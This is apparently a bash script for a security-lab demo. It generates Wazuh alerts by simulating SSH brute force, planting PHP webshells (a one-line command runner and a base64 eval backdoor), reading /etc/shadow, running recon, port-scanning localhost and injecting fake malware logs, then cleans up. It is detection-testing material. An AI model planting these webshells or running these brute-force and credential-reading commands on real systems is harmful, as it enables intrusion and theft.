#!/bin/bash
# ============================================================
# SOAR Demo Attack Script
# Run this on the Kali VM to generate security alerts
# that will appear in the Wazuh Dashboard
# ============================================================

echo "============================================"
echo "  SOAR DEMO ATTACK SIMULATION"
echo "  Run on: $(hostname) at $(date)"
echo "============================================"
echo ""

# -----------------------------------------------------------
# Attack 1: SSH Brute Force Simulation
# Triggers Rule 5716 (sshd auth failure) and Custom Rule 100001
# MITRE ATT&CK: T1110 (Brute Force)
# -----------------------------------------------------------
echo "[ATTACK 1] SSH Brute Force Simulation..."
echo "  Generating 10 failed SSH login attempts..."
for i in $(seq 1 10); do
    sshpass -p 'wrongpassword' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 fakeuser@127.0.0.1 2>/dev/null
    echo "    Attempt $i/10 sent"
    sleep 1
done
echo "  [DONE] SSH brute force alerts generated."
echo ""

# -----------------------------------------------------------
# Attack 2: Suspicious File Creation (Webshell Indicators)
# Triggers Syscheck (File Integrity Monitoring)
# -----------------------------------------------------------
echo "[ATTACK 2] Suspicious File Creation..."
echo "  Creating suspicious files in monitored directories..."
sudo mkdir -p /var/www/html 2>/dev/null

# Create webshell-like files
echo '<?php system($_GET["cmd"]); ?>' | sudo tee /var/www/html/shell.php > /dev/null
echo '<?php eval(base64_decode($_POST["x"])); ?>' | sudo tee /var/www/html/backdoor.php > /dev/null
echo "  Created: /var/www/html/shell.php"
echo "  Created: /var/www/html/backdoor.php"
echo "  [DONE] Webshell indicators planted."
echo ""

# -----------------------------------------------------------
# Attack 3: Privilege Escalation Attempts
# Triggers multiple sudo/auth log alerts
# -----------------------------------------------------------
echo "[ATTACK 3] Privilege Escalation Simulation..."
echo "  Attempting unauthorized sudo commands..."
sudo -u nobody whoami 2>/dev/null
sudo -u nobody cat /etc/shadow 2>&1 | head -1
su - root -c "whoami" 2>/dev/null <<< "wrongpassword"
echo "  [DONE] Privilege escalation attempts logged."
echo ""

# -----------------------------------------------------------
# Attack 4: Suspicious Process Execution
# Generates audit/syslog events for suspicious commands
# -----------------------------------------------------------
echo "[ATTACK 4] Suspicious Process Execution..."
echo "  Running reconnaissance commands..."
whoami
id
uname -a
cat /etc/passwd | head -5
cat /etc/hosts
netstat -tlnp 2>/dev/null || ss -tlnp
ps aux | head -10
echo "  [DONE] Recon commands executed and logged."
echo ""

# -----------------------------------------------------------
# Attack 5: Log Injection (Simulated Malware Detection)
# Injects suspicious log entries that Wazuh monitors
# -----------------------------------------------------------
echo "[ATTACK 5] Simulated Malware/Phishing Events..."
echo "  Injecting suspicious syslog entries..."
logger -t "security-alert" "MALWARE_DETECTED: trojan.generic found in /tmp/payload.exe"
logger -t "security-alert" "phishing_url_clicked: user accessed http://evil-phishing-site.com/login"
logger -t "security-alert" "Unauthorized access attempt from IP 10.0.0.99"
logger -t "security-alert" "Suspicious outbound connection to C2 server 185.220.101.1:4444"
logger -t "security-alert" "Rootkit behavior detected: hidden process found"
echo "  [DONE] Malware/phishing syslog events injected."
echo ""

# -----------------------------------------------------------
# Attack 6: Network Scanning Simulation
# Creates suspicious network activity logs
# -----------------------------------------------------------
echo "[ATTACK 6] Network Scanning Simulation..."
echo "  Performing port scan on localhost..."
for port in 22 80 443 8080 3306 5432 6379 27017; do
    timeout 1 bash -c "echo >/dev/tcp/127.0.0.1/$port" 2>/dev/null && echo "    Port $port: OPEN" || echo "    Port $port: closed"
done
echo "  [DONE] Port scan activity logged."
echo ""

# -----------------------------------------------------------
# Attack 7: File Integrity Monitoring Triggers
# Modifies critical system config files (safely)
# -----------------------------------------------------------
echo "[ATTACK 7] File Integrity Monitoring Triggers..."
echo "  Modifying monitored files..."
# Add and remove a comment from hosts file
echo "# SOAR-DEMO-TEST-ENTRY" | sudo tee -a /etc/hosts > /dev/null
echo "  Modified: /etc/hosts"
# Touch crontab
sudo touch /etc/crontab
echo "  Touched: /etc/crontab"
echo "  [DONE] FIM events generated."
echo ""

# -----------------------------------------------------------
# Attack 8: Authentication Log Flooding
# Creates auth.log entries that Wazuh detects
# -----------------------------------------------------------
echo "[ATTACK 8] Authentication Log Flooding..."
echo "  Generating failed authentication entries..."
for i in $(seq 1 5); do
    logger -p auth.warning "pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=10.0.0.$i user=admin"
    logger -p auth.warning "Failed password for invalid user hacker from 10.0.0.$i port 22 ssh2"
    sleep 0.5
done
echo "  [DONE] Auth log flood complete."
echo ""

# -----------------------------------------------------------
# Cleanup dangerous files (keep system safe)
# -----------------------------------------------------------
echo "[CLEANUP] Removing dangerous test files..."
sudo rm -f /var/www/html/shell.php /var/www/html/backdoor.php 2>/dev/null
sudo sed -i '/SOAR-DEMO-TEST-ENTRY/d' /etc/hosts 2>/dev/null
echo "  Cleaned up webshells and test entries."
echo ""

echo "============================================"
echo "  DEMO ATTACK COMPLETE!"
echo "  Total attack scenarios: 8"
echo ""
echo "  Check the Wazuh Dashboard at:"
echo "  https://localhost:443"
echo "  Login: admin / SecretPassword"
echo ""  
echo "  Navigate to:"
echo "    > Security Events (left menu)"
echo "    > Agents > kali (Agent 003)"
echo "  to see all generated alerts."
echo "============================================"
